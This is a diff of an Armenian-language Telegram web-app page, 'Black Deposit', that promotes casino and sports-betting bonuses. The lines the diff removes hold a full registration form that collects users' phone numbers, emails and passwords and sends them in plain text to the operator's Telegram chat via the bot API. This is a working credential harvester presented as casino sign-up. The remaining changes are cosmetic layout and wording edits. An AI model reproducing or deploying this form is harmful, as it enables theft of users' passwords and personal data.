@@ -3,77 +3,39 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Black Casino & Deposit</title>
+    <title>Black Deposit & Slots</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
 <body class="bg-black text-white font-sans min-h-screen flex flex-col justify-between pb-28">
 
-    <!-- ԳՐԱՆՑՄԱՆ ՊԱՏՈՒՀԱՆ (Սև ոճով) -->
-    <div id="auth-modal" class="fixed inset-0 bg-black/95 z-50 flex items-center justify-center p-4 hidden">
-        <div class="bg-zinc-900 border border-zinc-800 w-full max-w-sm p-6 rounded-3xl shadow-2xl space-y-4">
-            <div class="text-center space-y-1">
-                <h2 class="text-2xl font-black text-yellow-500">Black Deposit</h2>
-                <p class="text-xs text-zinc-400">Մուտք գործեք բոնուսներ ստանալու համար</p>
-            </div>
-
-            <form id="register-form" onsubmit="handleRegister(event)" class="space-y-3">
-                <div>
-                    <label class="text-xs text-zinc-400 block mb-1">Հեռախոսահամար</label>
-                    <input type="tel" id="phone" required placeholder="+374 XX XXXXXX" class="w-full bg-black border border-zinc-800 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-yellow-500 transition">
-                </div>
-                <div>
-                    <label class="text-xs text-zinc-400 block mb-1">Էլ. հասցե (Email)</label>
-                    <input type="email" id="email" required placeholder="example@mail.com" class="w-full bg-black border border-zinc-800 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-yellow-500 transition">
-                </div>
-                <div>
-                    <label class="text-xs text-zinc-400 block mb-1">Գաղտնաբառ</label>
-                    <input type="password" id="password" required placeholder="••••••••" class="w-full bg-black border border-zinc-800 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-yellow-500 transition">
-                </div>
-                <button type="submit" class="w-full bg-yellow-500 hover:bg-yellow-400 text-black font-bold py-3.5 rounded-xl transition mt-2 shadow-lg shadow-yellow-500/20">
-                    Մուտք գործել
-                </button>
-            </form>
-        </div>
-    </div>
-
-    <!-- ԳԼԽԱՎՈՐ ԷՋ -->
     <div>
-        <!-- Վերնագիր -->
         <header class="p-4 flex justify-between items-center border-b border-zinc-900 bg-black/90 backdrop-blur-md sticky top-0 z-30">
             <div class="flex items-center space-x-2">
                 <span class="text-xl font-black tracking-wider text-yellow-500">BLACK DEPOSIT</span>
             </div>
-            <div class="flex items-center space-x-3">
-                <button onclick="logout()" class="bg-zinc-900 border border-zinc-800 px-3 py-1 rounded-full text-xs font-bold text-red-400 transition">
-                    Ելք
-                </button>
+            <div class="flex items-center space-x-2">
+                <span class="text-xs bg-yellow-500/10 text-yellow-500 px-2.5 py-1 rounded-full font-bold">VIP Պլատֆորմ</span>
             </div>
         </header>
 
-        <!-- Բաներների սլայդեր -->
         <div class="p-4">
-            <div class="overflow-x-auto flex space-x-3 scrollbar-none snap-x">
-                <div class="min-w-[310px] h-44 bg-gradient-to-r from-zinc-900 to-zinc-800 border border-zinc-800 rounded-2xl p-5 flex flex-col justify-between snap-center shadow-xl relative overflow-hidden">
-                    <div>
-                        <span class="bg-yellow-500/20 text-yellow-400 text-[11px] px-2.5 py-1 rounded-md font-bold">BLACK VIP BONUS</span>
-                        <h2 class="text-3xl font-black mt-2 text-white">550% + 400 FS</h2>
-                    </div>
-                    <div class="flex justify-between items-center">
-                        <span class="text-xs text-zinc-400">Ակտիվ է սև դեպոզիտի համար</span>
-                        <span class="text-3xl">♠️</span>
-                    </div>
+            <div class="bg-gradient-to-r from-zinc-900 to-zinc-800 border border-zinc-800 rounded-2xl p-5 flex flex-col justify-between shadow-xl relative overflow-hidden">
+                <div>
+                    <span class="bg-yellow-500/20 text-yellow-400 text-[11px] px-2.5 py-1 rounded-md font-bold">ԲԱՑԱՌԻԿ ԱՌԱՋԱՐԿ</span>
+                    <h2 class="text-3xl font-black mt-2 text-white">550% + 400 FS</h2>
+                </div>
+                <div class="flex justify-between items-center mt-3">
+                    <span class="text-xs text-zinc-400">Ակտիվ է բոլոր խաղերի համար</span>
+                    <span class="text-3xl">♠️</span>
                 </div>
             </div>
         </div>
 
-        <!-- Բովանդակություն -->
         <main class="px-4 space-y-3" id="content-container">
-            <!-- Բեռնվում է JavaScript-ով -->
-        </main>
+            </main>
     </div>
 
-    <!-- Ներքևի նավարկման վահանակ -->
     <nav class="fixed bottom-0 left-0 right-0 bg-zinc-950/95 backdrop-blur-md border-t border-zinc-900 p-3 flex justify-around z-40">
         <button onclick="switchTab('games')" id="btn-games" class="flex items-center space-x-2 bg-yellow-500 text-black px-6 py-3 rounded-full font-bold text-sm transition shadow-lg shadow-yellow-500/20">
             <span>🎰</span>
@@ -85,48 +47,9 @@
         </button>
     </nav>
 
-    <!-- ՏՐԱՄԱԲԱՆՈՒԹՅՈՒՆ -->
     <script>
-        // ⚠ Հիշեցում. Բոտից հաղորդագրություն ստանալու համար նախ պետք է ձեր բոտին (Start) տված լինեք Telegram-ում:
-        const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; 
-        const CHAT_ID = 'YOUR_CHAT_ID_HERE';
-
         window.onload = function() {
-            const isRegistered = localStorage.getItem('casino_user_registered');
-            if (!isRegistered) {
-                document.getElementById('auth-modal').classList.remove('hidden');
-            }
             switchTab('games');
-        }
-
-        async function handleRegister(event) {
-            event.preventDefault();
-            const phone = document.getElementById('phone').value;
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-
-            if (phone && email && password) {
-                const message = `🚨 Նոր գրանցում (Black Deposit):\n\n📱 Հեռախոս: ${phone}\n📧 Email: ${email}\n🔑 Գաղտնաբառ: ${password}`;
-                
-                try {
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-                    });
-                } catch (error) {
-                    console.error('Error sending to telegram:', error);
-                }
-
-                localStorage.setItem('casino_user_registered', 'true');
-                document.getElementById('auth-modal').classList.add('hidden');
-                alert('Հաջողությամբ մուտք գործեցիք։');
-            }
-        }
-
-        function logout() {
-            localStorage.removeItem('casino_user_registered');
-            location.reload();
         }
 
         function copyCode(code) {
@@ -146,17 +69,16 @@
                 
                 container.innerHTML = `
                     <div class="flex justify-between items-center mb-1">
-                        <h3 class="text-xs font-bold text-zinc-400 uppercase tracking-wider">Սև Դեպոզիտ և Թոփ Սլոտեր</h3>
+                        <h3 class="text-xs font-bold text-zinc-400 uppercase tracking-wider">Թոփ Սլոտեր և Կազինո</h3>
                         <span class="text-xs text-yellow-500 font-bold">VIP</span>
                     </div>
                     
-                    <!-- Խաղ 1 -->
                     <div class="bg-zinc-900 border border-zinc-800 p-4 rounded-2xl flex items-center justify-between shadow-md">
                         <div class="flex items-center space-x-3.5">
                             <div class="w-14 h-14 bg-black border border-zinc-800 rounded-2xl flex items-center justify-center font-black text-xl text-yellow-500 shadow-inner">T</div>
                             <div>
                                 <h4 class="font-bold text-base text-white">Tonplay</h4>
-                                <p class="text-xs text-zinc-400 mt-0.5">Սև դեպոզիտի բոնուս</p>
+                                <p class="text-xs text-zinc-400 mt-0.5">Բոնուսային փաթեթ</p>
                                 <div class="flex gap-1.5 mt-2">
                                     <span class="bg-yellow-500/10 text-yellow-400 text-[11px] font-extrabold px-2 py-0.5 rounded-md">250 FS</span>
                                     <span class="bg-zinc-800 text-zinc-300 text-[11px] font-extrabold px-2 py-0.5 rounded-md">Մինչև 7775</span>
@@ -169,13 +91,12 @@
                         </div>
                     </div>
 
-                    <!-- Խաղ 2 -->
                     <div class="bg-zinc-900 border border-zinc-800 p-4 rounded-2xl flex items-center justify-between shadow-md">
                         <div class="flex items-center space-x-3.5">
                             <div class="w-14 h-14 bg-black border border-zinc-800 rounded-2xl flex items-center justify-center font-black text-xl text-yellow-500 shadow-inner">M</div>
                             <div>
                                 <h4 class="font-bold text-base text-white">Mellstroy Game</h4>
-                                <p class="text-xs text-zinc-400 mt-0.5">VIP փաթեթ</p>
+                                <p class="text-xs text-zinc-400 mt-0.5">VIP առաջարկ</p>
                                 <div class="flex gap-1.5 mt-2">
                                     <span class="bg-yellow-500/10 text-yellow-400 text-[11px] font-extrabold px-2 py-0.5 rounded-md">400 FS</span>
                                     <span class="bg-zinc-800 text-zinc-300 text-[11px] font-extrabold px-2 py-0.5 rounded-md">550%</span>
@@ -188,7 +109,6 @@
                         </div>
                     </div>
 
-                    <!-- Խաղ 3 -->
                     <div class="bg-zinc-900 border border-zinc-800 p-4 rounded-2xl flex items-center justify-between shadow-md">
                         <div class="flex items-center space-x-3.5">
                             <div class="w-14 h-14 bg-black border border-zinc-800 rounded-2xl flex items-center justify-center font-black text-xl text-yellow-500 shadow-inner">Л</div>
@@ -207,7 +127,6 @@
                         </div>
                     </div>
 
-                    <!-- Խաղ 4 -->
                     <div class="bg-zinc-900 border border-zinc-800 p-4 rounded-2xl flex items-center justify-between shadow-md">
                         <div class="flex items-center space-x-3.5">
                             <div class="w-14 h-14 bg-black border border-zinc-800 rounded-2xl flex items-center justify-center font-black text-xl text-yellow-500 shadow-inner">F</div>
@@ -236,7 +155,6 @@
                         <span class="text-xs text-yellow-500 font-bold">VIP</span>
                     </div>
                     
-                    <!-- Սպորտ 1 -->
                     <div class="bg-zinc-900 border border-zinc-800 p-4 rounded-2xl flex items-center justify-between shadow-md">
                         <div class="flex items-center space-x-3.5">
                             <div class="w-14 h-14 bg-black border border-zinc-800 rounded-2xl flex items-center justify-center font-black text-lg text-yellow-500 shadow-inner">1W</div>
@@ -254,7 +172,6 @@
                         </div>
                     </div>
 
-                    <!-- Սպորտ 2 -->
                     <div class="bg-zinc-900 border border-zinc-800 p-4 rounded-2xl flex items-center justify-between shadow-md">
                         <div class="flex items-center space-x-3.5">
                             <div class="w-14 h-14 bg-black border border-zinc-800 rounded-2xl flex items-center justify-center font-black text-lg text-yellow-500 shadow-inner">888</div>
